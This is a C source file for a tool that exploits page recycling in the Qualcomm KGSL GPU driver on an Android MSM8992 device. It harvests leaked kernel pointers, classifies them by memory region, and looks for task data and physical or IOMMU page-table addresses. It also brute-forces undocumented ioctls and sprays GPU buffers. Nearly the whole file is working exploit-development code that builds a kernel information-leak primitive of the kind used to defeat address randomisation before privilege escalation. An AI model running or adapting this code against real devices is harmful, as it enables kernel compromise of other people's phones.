/*
 * kgsl_leak_dump.c — Detailed dump of kernel data leaked via KGSL page recycling
 *
 * KGSL probe v2 found 112 kernel pointers in recycled GPU pages (0xffffffbc01xxxxxx).
 * This tool does a full hex dump of leaked pages, analyzes pointer patterns,
 * and tries to identify the kernel structures they belong to.
 *
 * Also probes unidentified ioctls 0x21 and 0x24.
 *
 * Cross-compile:
 *   aarch64-linux-musl-gcc -static -O2 -o kgsl_leak_dump kgsl_leak_dump.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>

#define KGSL_IOC_TYPE 0x09

struct kgsl_gpumem_alloc {
    unsigned long gpuaddr;
    size_t size;
    unsigned int flags;
};

struct kgsl_sharedmem_free {
    unsigned long gpuaddr;
};

struct kgsl_device_getproperty {
    unsigned int type;
    void *value;
    size_t sizebytes;
};

#define IOCTL_KGSL_GPUMEM_ALLOC \
    _IOWR(KGSL_IOC_TYPE, 0x2F, struct kgsl_gpumem_alloc)

#define IOCTL_KGSL_SHAREDMEM_FREE \
    _IOW(KGSL_IOC_TYPE, 0x15, struct kgsl_sharedmem_free)

#define IOCTL_KGSL_DEVICE_GETPROPERTY \
    _IOWR(KGSL_IOC_TYPE, 0x02, struct kgsl_device_getproperty)

static int kgsl_fd = -1;

/*
 * Allocate GPU memory and return mmap'd pointer. Caller must free.
 */
static void *gpu_alloc_mmap(size_t size, unsigned long *out_gpuaddr) {
    struct kgsl_gpumem_alloc alloc = {0};
    alloc.size = size;
    alloc.flags = 0;
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc) < 0) return NULL;
    *out_gpuaddr = alloc.gpuaddr;

    void *mapped = mmap(NULL, size, PROT_READ | PROT_WRITE,
                       MAP_SHARED, kgsl_fd, alloc.gpuaddr);
    if (mapped == MAP_FAILED) {
        struct kgsl_sharedmem_free fr = { .gpuaddr = alloc.gpuaddr };
        ioctl(kgsl_fd, IOCTL_KGSL_SHAREDMEM_FREE, &fr);
        return NULL;
    }
    return mapped;
}

static void gpu_free(unsigned long gpuaddr, void *mapped, size_t size) {
    if (mapped) munmap(mapped, size);
    struct kgsl_sharedmem_free fr = { .gpuaddr = gpuaddr };
    ioctl(kgsl_fd, IOCTL_KGSL_SHAREDMEM_FREE, &fr);
}

/*
 * Hex dump a region, highlighting kernel pointers
 */
static void hexdump_region(const void *data, size_t size, size_t base_offset) {
    const uint8_t *bytes = (const uint8_t *)data;
    const uint64_t *qwords = (const uint64_t *)data;

    for (size_t off = 0; off < size; off += 32) {
        /* Check if this line has any non-zero data */
        int nonzero = 0;
        size_t end = off + 32;
        if (end > size) end = size;
        for (size_t i = off; i < end; i++) {
            if (bytes[i] != 0) { nonzero = 1; break; }
        }
        if (!nonzero) continue;

        printf("  %06zx: ", base_offset + off);

        /* Print hex */
        for (size_t i = off; i < off + 32 && i < size; i += 8) {
            uint64_t val = *(uint64_t *)(bytes + i);
            /* Highlight kernel pointers */
            if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != (uint64_t)-1) {
                printf(" *%016lx", val);
            } else if (val != 0) {
                printf("  %016lx", val);
            } else {
                printf("  ................");
            }
        }
        printf("\n");
    }
}

/*
 * Classify a kernel pointer
 */
static const char *classify_kptr(uint64_t ptr) {
    if ((ptr & 0xFFFFFFF000000000ULL) == 0xFFFFFFC000000000ULL)
        return "KERNEL_TEXT";
    if ((ptr & 0xFFFFFFF000000000ULL) == 0xFFFFFFBF00000000ULL)
        return "MODULES";
    if ((ptr & 0xFFFFFF0000000000ULL) == 0xFFFFFFBC00000000ULL)
        return "VMALLOC_LOW";
    if ((ptr & 0xFFFFFF0000000000ULL) == 0xFFFFFFBE00000000ULL)
        return "VMALLOC_HIGH";
    if ((ptr & 0xFFFFFF0000000000ULL) == 0xFFFFFFE000000000ULL)
        return "LINEAR_MAP";
    if ((ptr & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL)
        return "KERNEL_OTHER";
    return "UNKNOWN";
}

/*
 * Full analysis of leaked GPU page
 */
static void analyze_leaked_page(void *data, size_t size) {
    uint64_t *qwords = (uint64_t *)data;
    size_t nqwords = size / 8;

    /* Collect all kernel pointers */
    int num_ptrs = 0;
    uint64_t min_ptr = (uint64_t)-1, max_ptr = 0;

    printf("\n  --- Kernel Pointers Found ---\n");
    for (size_t i = 0; i < nqwords; i++) {
        uint64_t val = qwords[i];
        if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != (uint64_t)-1) {
            if (num_ptrs < 50) {
                printf("    [%04zx] 0x%016lx  %s\n", i * 8, val, classify_kptr(val));
            }
            num_ptrs++;
            if (val < min_ptr) min_ptr = val;
            if (val > max_ptr) max_ptr = val;
        }
    }
    if (num_ptrs > 50) printf("    ... and %d more\n", num_ptrs - 50);

    printf("\n  --- Pointer Statistics ---\n");
    printf("    Total kernel pointers: %d\n", num_ptrs);
    if (num_ptrs > 0) {
        printf("    Range: 0x%016lx - 0x%016lx\n", min_ptr, max_ptr);
        printf("    Span:  0x%lx (%lu bytes)\n", max_ptr - min_ptr, max_ptr - min_ptr);
    }

    /* Look for pointer pairs (linked list heads) */
    printf("\n  --- Linked List Detection ---\n");
    int list_heads = 0;
    for (size_t i = 0; i + 1 < nqwords; i++) {
        uint64_t a = qwords[i], b = qwords[i + 1];
        if ((a & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL &&
            (b & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL &&
            a != (uint64_t)-1 && b != (uint64_t)-1) {
            /* Two consecutive kernel pointers = likely list_head */
            int64_t diff = (int64_t)(b - a);
            if (diff > -4096 && diff < 4096 && diff != 0) {
                if (list_heads < 20) {
                    printf("    [%04zx] next=0x%016lx prev=0x%016lx  (diff=%ld)\n",
                           i * 8, a, b, diff);
                }
                list_heads++;
            }
        }
    }
    printf("    List heads found: %d\n", list_heads);

    /* Look for potential task_struct markers (PID, UID) */
    printf("\n  --- PID/UID Search ---\n");
    pid_t my_pid = getpid();
    uid_t my_uid = getuid();
    uint32_t *dwords = (uint32_t *)data;
    for (size_t i = 0; i < size / 4; i++) {
        if (dwords[i] == (uint32_t)my_pid) {
            printf("    PID %d found at offset 0x%04zx\n", my_pid, i * 4);
        }
        if (dwords[i] == my_uid && my_uid != 0) {
            printf("    UID %d found at offset 0x%04zx\n", my_uid, i * 4);
        }
    }

    /* Look for non-zero, non-pointer data (might be sizes, flags, counters) */
    printf("\n  --- Non-zero Data Regions ---\n");
    int regions = 0;
    size_t region_start = 0;
    int in_region = 0;
    for (size_t i = 0; i < nqwords; i++) {
        if (qwords[i] != 0) {
            if (!in_region) { region_start = i * 8; in_region = 1; }
        } else {
            if (in_region) {
                size_t region_end = i * 8;
                if (regions < 10) {
                    printf("    [%04zx-%04zx] %zu bytes of data\n",
                           region_start, region_end, region_end - region_start);
                }
                regions++;
                in_region = 0;
            }
        }
    }
    printf("    Total non-zero regions: %d\n", regions);

    /* Full hex dump of non-zero regions */
    printf("\n  --- Hex Dump (non-zero regions only) ---\n");
    hexdump_region(data, size, 0);
}

/*
 * Test 1: Churn GPU memory and dump full pages
 */
static void test_detailed_leak(void) {
    printf("\n=== Test 1: Detailed GPU Memory Leak Dump ===\n");

    size_t alloc_size = 262144;  /* 256KB */

    /* Phase 1: Churn - allocate and free to dirty the pages */
    printf("  Phase 1: Churning %zu pages...\n", alloc_size / 4096);
    for (int i = 0; i < 30; i++) {
        unsigned long gaddr;
        void *p = gpu_alloc_mmap(65536, &gaddr);
        if (p) {
            /* Write some data to ensure pages are dirtied */
            memset(p, 0x42, 65536);
            gpu_free(gaddr, p, 65536);
        }
    }

    /* Phase 2: Allocate and scan */
    printf("  Phase 2: Scanning recycled pages...\n\n");
    unsigned long gaddr;
    void *data = gpu_alloc_mmap(alloc_size, &gaddr);
    if (!data) {
        printf("  Failed to allocate scan buffer\n");
        return;
    }

    analyze_leaked_page(data, alloc_size);
    gpu_free(gaddr, data, alloc_size);
}

/*
 * Test 2: Try to find physical addresses in GPU page table structures
 * The leaked pointers at 0xffffffbc01xxxxxx are likely KGSL's IOMMU
 * page table entries. These should contain physical addresses.
 */
static void test_find_physaddr(void) {
    printf("\n=== Test 2: Physical Address Detection ===\n");

    size_t alloc_size = 1048576;  /* 1MB to get more data */
    unsigned long gaddr;

    /* Churn with various sizes */
    for (int i = 0; i < 20; i++) {
        void *p = gpu_alloc_mmap(4096 * (i + 1), &gaddr);
        if (p) gpu_free(gaddr, p, 4096 * (i + 1));
    }

    void *data = gpu_alloc_mmap(alloc_size, &gaddr);
    if (!data) {
        printf("  Failed to allocate\n");
        return;
    }

    uint64_t *qwords = (uint64_t *)data;
    printf("  Scanning for potential physical addresses...\n");

    /* Physical addresses on MSM8992 are typically in ranges:
     * 0x00000000-0x3FFFFFFF (1GB) - DDR bank 0
     * 0x40000000-0x7FFFFFFF (1GB) - DDR bank 1
     * 0x80000000-0xBFFFFFFF (1GB) - DDR bank 2
     * These appear as page-aligned values < 0x100000000
     */
    int phys_candidates = 0;
    for (size_t i = 0; i < alloc_size / 8; i++) {
        uint64_t val = qwords[i];
        /* Physical page address: aligned to 4KB, within DDR range */
        if (val != 0 && (val & 0xFFF) == 0 && val < 0x200000000ULL && val >= 0x80000ULL) {
            if (phys_candidates < 30) {
                printf("    [%06zx] 0x%016lx  (phys page? %luMB offset)\n",
                       i * 8, val, val / (1024 * 1024));
            }
            phys_candidates++;
        }

        /* IOMMU PTE format: bits[11:0] = flags, bits[47:12] = physical page
         * Check for entries that look like valid PTEs */
        if (val != 0 && (val & 0x3) != 0 && val < 0x1000000000ULL) {
            uint64_t phys = val & ~0xFFFULL;
            if (phys >= 0x80000 && phys < 0x200000000ULL) {
                if (phys_candidates < 50) {
                    printf("    [%06zx] 0x%016lx  (IOMMU PTE? phys=0x%lx flags=0x%lx)\n",
                           i * 8, val, phys, val & 0xFFF);
                }
                phys_candidates++;
            }
        }
    }
    printf("  Physical address candidates: %d\n", phys_candidates);

    gpu_free(gaddr, data, alloc_size);
}

/*
 * Test 3: Probe unidentified ioctls 0x21 and 0x24
 */
static void test_unknown_ioctls(void) {
    printf("\n=== Test 3: Unknown IOCTL Probing ===\n");

    /* ioctl 0x21 - brute force showed IOWR/8 recognized (EINVAL)
     * Could be CMDWINDOW_WRITE:
     *   struct kgsl_cmdwindow_write { unsigned int addr; unsigned int data; }
     * Or something else. Try various struct sizes.
     */
    printf("\n  --- IOCTL 0x21 ---\n");
    for (size_t sz = 4; sz <= 64; sz += 4) {
        unsigned char buf[64];
        memset(buf, 0, sizeof(buf));
        unsigned long cmd;

        /* Try all directions */
        unsigned long dirs[] = {
            _IO(KGSL_IOC_TYPE, 0x21),
            _IOR(KGSL_IOC_TYPE, 0x21, char[4]),  /* dummy for size calc */
        };

        /* Build custom ioctl with exact size */
        /* _IOWR(type, nr, size) */
        cmd = _IOC(_IOC_READ | _IOC_WRITE, KGSL_IOC_TYPE, 0x21, sz);
        int ret = ioctl(kgsl_fd, cmd, buf);
        if (ret == 0) {
            printf("  IOWR size=%2zu: SUCCESS! data=", sz);
            for (size_t i = 0; i < sz && i < 32; i++) printf("%02x", buf[i]);
            printf("\n");
        } else if (errno == EINVAL) {
            printf("  IOWR size=%2zu: EINVAL (recognized)\n", sz);
        }
        /* Also try IOW */
        cmd = _IOC(_IOC_WRITE, KGSL_IOC_TYPE, 0x21, sz);
        memset(buf, 0, sizeof(buf));
        ret = ioctl(kgsl_fd, cmd, buf);
        if (ret == 0) {
            printf("  IOW  size=%2zu: SUCCESS!\n", sz);
        } else if (errno == EINVAL) {
            /* Only show if IOWR didn't also match */
        }
    }

    /* ioctl 0x24 - brute force showed IOR/8 recognized
     * Could be PERFCOUNTER_GET
     */
    printf("\n  --- IOCTL 0x24 ---\n");
    for (size_t sz = 4; sz <= 64; sz += 4) {
        unsigned char buf[64];
        memset(buf, 0, sizeof(buf));
        unsigned long cmd;

        cmd = _IOC(_IOC_READ | _IOC_WRITE, KGSL_IOC_TYPE, 0x24, sz);
        int ret = ioctl(kgsl_fd, cmd, buf);
        if (ret == 0) {
            printf("  IOWR size=%2zu: SUCCESS! data=", sz);
            for (size_t i = 0; i < sz && i < 32; i++) printf("%02x", buf[i]);
            printf("\n");
        } else if (errno == EINVAL) {
            printf("  IOWR size=%2zu: EINVAL\n", sz);
        }

        cmd = _IOC(_IOC_READ, KGSL_IOC_TYPE, 0x24, sz);
        memset(buf, 0, sizeof(buf));
        ret = ioctl(kgsl_fd, cmd, buf);
        if (ret == 0) {
            printf("  IOR  size=%2zu: SUCCESS! data=", sz);
            for (size_t i = 0; i < sz && i < 32; i++) printf("%02x", buf[i]);
            printf("\n");
        } else if (errno == EINVAL) {
            printf("  IOR  size=%2zu: EINVAL\n", sz);
        }
    }

    /* ioctl 0x35 was also EINVAL - this is GPUMEM_FREE_ID
     * Try with proper struct */
    printf("\n  --- IOCTL 0x35 (GPUMEM_FREE_ID) ---\n");
    for (size_t sz = 4; sz <= 16; sz += 4) {
        unsigned char buf[16];
        memset(buf, 0, sizeof(buf));
        /* Try freeing id=0 (should fail gracefully) */
        unsigned long cmd = _IOC(_IOC_READ | _IOC_WRITE, KGSL_IOC_TYPE, 0x35, sz);
        int ret = ioctl(kgsl_fd, cmd, buf);
        printf("  IOWR size=%2zu: %s (errno=%d)\n", sz,
               ret == 0 ? "SUCCESS" : strerror(errno), errno);
    }
}

/*
 * Test 4: Try DRAWCTXT_CREATE with various struct sizes
 * Brute force showed 0x13 recognized with IOWR/8. Try to find the right args.
 */
static void test_drawctxt_bruteforce(void) {
    printf("\n=== Test 4: DRAWCTXT_CREATE Deep Probe ===\n");

    /* Standard struct: { uint32_t flags; uint32_t drawctxt_id; } = 8 bytes
     * Already tried various flags. The issue might be that the struct is bigger. */
    for (size_t sz = 8; sz <= 48; sz += 4) {
        unsigned char buf[48];
        memset(buf, 0, sizeof(buf));

        /* Set various flag values in the first 4 bytes */
        uint32_t *flags = (uint32_t *)buf;

        /* Try with type = GL (default) */
        *flags = 0;  /* No flags = default type */
        unsigned long cmd = _IOC(_IOC_READ | _IOC_WRITE, KGSL_IOC_TYPE, 0x13, sz);
        int ret = ioctl(kgsl_fd, cmd, buf);
        if (ret == 0) {
            printf("  IOWR size=%2zu flags=0x00000000: SUCCESS!\n", sz);
            printf("    Returned data: ");
            for (size_t i = 0; i < sz; i++) printf("%02x", buf[i]);
            printf("\n");
            printf("    Context ID (offset 4): %u\n", *(uint32_t *)(buf + 4));
            return;  /* Found it! */
        }

        /* Try with PREAMBLE flag */
        *flags = 0x00000002;
        memset(buf + 4, 0, sz - 4);
        ret = ioctl(kgsl_fd, cmd, buf);
        if (ret == 0) {
            printf("  IOWR size=%2zu flags=0x00000002: SUCCESS!\n", sz);
            printf("    Context ID: %u\n", *(uint32_t *)(buf + 4));
            return;
        }

        /* Try with USER_GENERATED_TS flag (common on adreno 4xx) */
        *flags = 0x00001000;
        memset(buf + 4, 0, sz - 4);
        ret = ioctl(kgsl_fd, cmd, buf);
        if (ret == 0) {
            printf("  IOWR size=%2zu flags=0x00001000: SUCCESS!\n", sz);
            printf("    Context ID: %u\n", *(uint32_t *)(buf + 4));
            return;
        }

        /* Just report EINVAL status per size */
        if (errno == EINVAL) {
            printf("  IOWR size=%2zu: EINVAL\n", sz);
        } else {
            printf("  IOWR size=%2zu: %s\n", sz, strerror(errno));
        }
    }
}

/*
 * Test 5: Read /proc/self/pagemap for GPU buffer to find physical address
 */
static void test_pagemap(void) {
    printf("\n=== Test 5: Pagemap Physical Address Lookup ===\n");

    /* Allocate GPU buffer */
    unsigned long gaddr;
    void *mapped = gpu_alloc_mmap(4096, &gaddr);
    if (!mapped) {
        printf("  Failed to allocate GPU buffer\n");
        return;
    }

    /* Touch the page to ensure it's faulted in */
    memset(mapped, 0x42, 4096);

    /* Read pagemap for this virtual address */
    int pm_fd = open("/proc/self/pagemap", O_RDONLY);
    if (pm_fd < 0) {
        printf("  /proc/self/pagemap: %s\n", strerror(errno));
        gpu_free(gaddr, mapped, 4096);
        return;
    }

    unsigned long vaddr = (unsigned long)mapped;
    unsigned long page_idx = vaddr / 4096;
    off_t offset = page_idx * 8;

    if (lseek(pm_fd, offset, SEEK_SET) < 0) {
        printf("  pagemap seek: %s\n", strerror(errno));
        close(pm_fd);
        gpu_free(gaddr, mapped, 4096);
        return;
    }

    uint64_t pme;
    if (read(pm_fd, &pme, 8) != 8) {
        printf("  pagemap read: %s\n", strerror(errno));
        close(pm_fd);
        gpu_free(gaddr, mapped, 4096);
        return;
    }

    printf("  GPU buffer virtual:  0x%lx\n", vaddr);
    printf("  GPU address:         0x%lx\n", gaddr);
    printf("  Pagemap entry:       0x%016lx\n", pme);

    if (pme & (1ULL << 63)) {
        uint64_t pfn = pme & ((1ULL << 55) - 1);
        uint64_t phys = pfn * 4096;
        printf("  Page present!  PFN=0x%lx  Physical=0x%lx\n", pfn, phys);
        printf("  >>> GPU buffer physical address: 0x%lx <<<\n", phys);
    } else {
        printf("  Page not present or swapped (pagemap restricted?)\n");
    }

    close(pm_fd);
    gpu_free(gaddr, mapped, 4096);
}

/*
 * Test 6: Spray multiple GPU buffers and look for adjacent kernel data
 */
static void test_gpu_spray(void) {
    printf("\n=== Test 6: GPU Memory Spray ===\n");
    printf("  Allocating 20 GPU buffers and checking for kernel data between them...\n");

    struct {
        unsigned long gaddr;
        void *mapped;
        size_t size;
    } bufs[20];
    int count = 0;

    /* Allocate many buffers */
    for (int i = 0; i < 20; i++) {
        bufs[i].size = 4096;
        bufs[i].mapped = gpu_alloc_mmap(bufs[i].size, &bufs[i].gaddr);
        if (bufs[i].mapped) {
            count++;
            /* Write a marker pattern */
            uint64_t *p = (uint64_t *)bufs[i].mapped;
            p[0] = 0xDEADBEEF00000000ULL | i;
        }
    }
    printf("  Allocated %d GPU buffers\n", count);

    /* Check if any buffer has kernel pointers */
    for (int i = 0; i < 20; i++) {
        if (!bufs[i].mapped) continue;
        uint64_t *data = (uint64_t *)bufs[i].mapped;
        int kptrs = 0;
        for (size_t j = 0; j < bufs[i].size / 8; j++) {
            if ((data[j] & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL &&
                data[j] != (uint64_t)-1) {
                kptrs++;
            }
        }
        printf("  buf[%2d] gpuaddr=0x%05lx marker=0x%016lx kptrs=%d\n",
               i, bufs[i].gaddr, *(uint64_t *)bufs[i].mapped, kptrs);
    }

    /* Free all */
    for (int i = 0; i < 20; i++) {
        if (bufs[i].mapped) gpu_free(bufs[i].gaddr, bufs[i].mapped, bufs[i].size);
    }
}

int main(void) {
    printf("=== KGSL Leak Dump — Detailed Analysis ===\n");
    printf("PID: %d  UID: %d\n", getpid(), getuid());

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) {
        perror("open /dev/kgsl-3d0");
        return 1;
    }

    test_detailed_leak();
    test_find_physaddr();
    test_unknown_ioctls();
    test_drawctxt_bruteforce();
    test_pagemap();
    test_gpu_spray();

    printf("\n=== Done ===\n");
    close(kgsl_fd);
    return 0;
}
